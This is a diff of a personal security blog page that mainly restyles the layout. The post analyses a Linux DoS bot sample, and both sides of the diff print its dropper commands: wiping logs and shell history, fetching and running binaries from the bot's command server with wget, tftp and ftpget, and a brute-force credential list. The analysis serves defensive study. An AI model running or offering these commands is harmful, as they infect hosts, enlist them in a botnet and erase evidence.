@@ -9,7 +9,10 @@
     <title>Fakhri Zulkifli</title>
 
     <!-- Bootstrap -->
-    <link rel="stylesheet" href="/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/bootstrap-4.0.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/fontawesome-5.13.0/css/fontawesome.css">
+    <link rel="stylesheet" href="/css/fontawesome-5.13.0/css/brands.css">
+    <link rel="stylesheet" href="/css/fontawesome-5.13.0/css/solid.css">
     <link rel="stylesheet" href="/css/main.css">
 
     <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
@@ -39,24 +42,23 @@
       <div class="container">
 
         <header class="row">
-  <div class="col-lg-8 col-lg-offset-2">
+  <div class="col-lg-8 col-lg-offset-2" style="margin: auto">
     <h1 class="">Fakhri Zulkifli</h1>
     <p>
-    <div align="center">
-    <a href="https://github.com/fakhrizulkifli" target="_blank"><span class="string">https://github.com/fakhrizulkifli</a>
-    •
-    <a href="https://twitter.com/d0lph1n98" target="_blank"><span class="string">https://twitter.com/d0lph1n98</a>
+    <div style="margin: auto">
+    <a href="https://github.com/fakhrizulkifli" target="_blank"><span style="font-size: large" class="fab fa-github-square"></span></a>
+    <a href="https://twitter.com/d0lph1n98" target="_blank"><span style="font-size: large" class="fab fa-twitter-square"></span></a>
+    <a href="https://linkedin.com/fakhrizulkifli" target="_blank"><span style="font-size: large" class="fab fa-linkedin"></span></a>
     </div>
     </p>
   </div>
 </header>
 
 <div class="row">
-  <div class="col-lg-8 col-lg-offset-2">
+  <div style="width:-webkit-fill-available">
     <div class="menu">
       <ul>
-          <li><a href="/">home</a></li>
-          <li><a href="/blog/">blog</a></li>
+          <li><a href="/blog/">/root</a></li>
       </ul>
     </div>
   </div>
@@ -65,12 +67,12 @@
 
 
         <div class="row">
-          <div class="col-lg-8 col-lg-offset-2">
+          <div style="width:-webkit-fill-available">
             <main>
             <div class="post">
 
   <header class="post-header">
-    <h1>b08f9dc5784532be5b3f695f37c7781b</h1>
+    <h1 style="text-align: center">b08f9dc5784532be5b3f695f37c7781b</h1>
   </header>
 
   <article class="post-content">
@@ -87,14 +89,14 @@
   <article class="post-content">
   <p>Initial file dropped:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>clear ; unset ; rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog /root/.bash_history ; unset HISTFILE ; unset HISTSAVE ; unset HISTLOG ; history -n ; unset WATCH ; export HISTFILE=/dev/null ; wget keedz.tk/client ; chmod +x client ; ./client ; rm -rf client ; rm -rf bash_history ; export HISTFILE=/dev/null ; rm -rf botz.sh ; exit
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>clear <span class="p">;</span> <span class="nb">unset</span> <span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog /root/.bash_history <span class="p">;</span> <span class="nb">unset </span>HISTFILE <span class="p">;</span> <span class="nb">unset </span>HISTSAVE <span class="p">;</span> <span class="nb">unset </span>HISTLOG <span class="p">;</span> <span class="nb">history</span> <span class="nt">-n</span> <span class="p">;</span> <span class="nb">unset </span>WATCH <span class="p">;</span> <span class="nb">export </span><span class="nv">HISTFILE</span><span class="o">=</span>/dev/null <span class="p">;</span> wget keedz.tk/client <span class="p">;</span> <span class="nb">chmod</span> +x client <span class="p">;</span> ./client <span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> client <span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> bash_history <span class="p">;</span> <span class="nb">export </span><span class="nv">HISTFILE</span><span class="o">=</span>/dev/null <span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> botz.sh <span class="p">;</span> <span class="nb">exit</span>
 </code></pre></div></div>
 
 <p>The <code class="highlighter-rouge">client</code> is a 64-bit ELF binary. The binary acts as a DoS bot which connect to their CNC (5.135.209.121) on port 23.</p>
 
 <p>Available commands:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GETLOCALIP
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GETLOCALIP
 SCANNER ON | OFF
 HOLD
 JUNK
@@ -106,20 +108,20 @@ FUCKOFF
 
 <p>Below is the connection to the CNC:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying 5.135.209.121...
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying 5.135.209.121...
 Connected to ip121.ip-5-135-209.eu.
-Escape character is '^]'.
-!* SCANNER ON
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+<span class="o">!</span><span class="k">*</span> SCANNER ON
 PING
 PONG
 </code></pre></div></div>
 
 <p>If you try to connect for the 2nd time, this will be output.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying 5.135.209.121...
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying 5.135.209.121...
 Connected to ip121.ip-5-135-209.eu.
-Escape character is '^]'.
-!* LOLNOGTFO
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+<span class="o">!</span><span class="k">*</span> LOLNOGTFO
 Connection closed by foreign host.
 </code></pre></div></div>
 
@@ -129,7 +131,7 @@ Connection closed by foreign host.
 
 <p>List of usernames:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root
 admin
 user
 login
@@ -138,7 +140,7 @@ support
 </code></pre></div></div>
 <p>List of passwords:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root
 toor
 admin
 user
@@ -155,25 +157,25 @@ support
 
 <p>Once logged in, it will execute the following commands:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 5.135.209.121 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 5.135.209.121; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 23 5.135.209.121 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/bins.sh<span class="p">;</span> <span class="nb">chmod </span>777 bins.sh<span class="p">;</span> sh bins.sh<span class="p">;</span> tftp 5.135.209.121 <span class="nt">-c</span> get tftp1.sh<span class="p">;</span> <span class="nb">chmod </span>777 tftp1.sh<span class="p">;</span> sh tftp1.sh<span class="p">;</span> tftp <span class="nt">-r</span> tftp2.sh <span class="nt">-g</span> 5.135.209.121<span class="p">;</span> <span class="nb">chmod </span>777 tftp2.sh<span class="p">;</span> sh tftp2.sh<span class="p">;</span> ftpget <span class="nt">-v</span> <span class="nt">-u</span> anonymous <span class="nt">-p</span> anonymous <span class="nt">-P</span> 23 5.135.209.121 ftp1.sh ftp1.sh<span class="p">;</span> sh ftp1.sh<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> bins.sh tftp1.sh tftp2.sh ftp1.sh<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="k">*</span><span class="p">;</span> <span class="nb">exit</span>
 </code></pre></div></div>
 
 <p>Inside bins.sh, more binary will be fetch</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-e #!/bin/bash
--e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
--e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sshd; chmod +x sshd; ./sshd; rm -rf sshd
--e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/openssh; chmod +x openssh; ./openssh; rm -rf openssh
--e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bash; chmod +x bash; ./bash; rm -rf bash
--e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/tftp; chmod +x tftp; ./tftp; rm -rf tftp
--e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/wget; chmod +x wget; ./wget; rm -rf wget
--e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/cron; chmod +x cron; ./cron; rm -rf cron
--e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ftp; chmod +x ftp; ./ftp; rm -rf ftp
--e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/pftp; chmod +x pftp; ./pftp; rm -rf pftp
--e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sh; chmod +x sh; ./sh; rm -rf sh
--e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/' '; chmod +x ' '; ./' '; rm -rf ' '
--e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/apache2; chmod +x apache2; ./apache2; rm -rf apache2
--e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-e</span> <span class="c">#!/bin/bash</span>
+<span class="nt">-e</span> <span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/ntpd<span class="p">;</span> <span class="nb">chmod</span> +x ntpd<span class="p">;</span> ./ntpd<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> ntpd
+<span class="nt">-e</span> <span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/sshd<span class="p">;</span> <span class="nb">chmod</span> +x sshd<span class="p">;</span> ./sshd<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> sshd
+<span class="nt">-e</span> <span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/openssh<span class="p">;</span> <span class="nb">chmod</span> +x openssh<span class="p">;</span> ./openssh<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> openssh
+<span class="nt">-e</span> <span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/bash<span class="p">;</span> <span class="nb">chmod</span> +x bash<span class="p">;</span> ./bash<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> bash
+<span class="nt">-e</span> <span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/tftp<span class="p">;</span> <span class="nb">chmod</span> +x tftp<span class="p">;</span> ./tftp<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> tftp
+<span class="nt">-e</span> <span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/wget<span class="p">;</span> <span class="nb">chmod</span> +x wget<span class="p">;</span> ./wget<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> wget
+<span class="nt">-e</span> <span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/cron<span class="p">;</span> <span class="nb">chmod</span> +x cron<span class="p">;</span> ./cron<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> cron
+<span class="nt">-e</span> <span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/ftp<span class="p">;</span> <span class="nb">chmod</span> +x ftp<span class="p">;</span> ./ftp<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> ftp
+<span class="nt">-e</span> <span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/pftp<span class="p">;</span> <span class="nb">chmod</span> +x pftp<span class="p">;</span> ./pftp<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> pftp
+<span class="nt">-e</span> <span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/sh<span class="p">;</span> <span class="nb">chmod</span> +x sh<span class="p">;</span> ./sh<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> sh
+<span class="nt">-e</span> <span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/<span class="s1">' '</span><span class="p">;</span> <span class="nb">chmod</span> +x <span class="s1">' '</span><span class="p">;</span> ./<span class="s1">' '</span><span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="s1">' '</span>
+<span class="nt">-e</span> <span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/apache2<span class="p">;</span> <span class="nb">chmod</span> +x apache2<span class="p">;</span> ./apache2<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> apache2
+<span class="nt">-e</span> <span class="nb">cd</span> /tmp <span class="o">||</span> <span class="nb">cd</span> /var/run <span class="o">||</span> <span class="nb">cd</span> /mnt <span class="o">||</span> <span class="nb">cd</span> /root <span class="o">||</span> <span class="nb">cd</span> /<span class="p">;</span> wget http://5.135.209.121/telnetd<span class="p">;</span> <span class="nb">chmod</span> +x telnetd<span class="p">;</span> ./telnetd<span class="p">;</span> <span class="nb">rm</span> <span class="nt">-rf</span> telnetd
 </code></pre></div></div>
 
   </article>
@@ -209,7 +211,7 @@ support
         </div>
 
         <div class="row">
-  <div class="col-lg-8 col-lg-offset-2">
+  <div style="width:-webkit-fill-available">
     <footer>
       
     </footer>
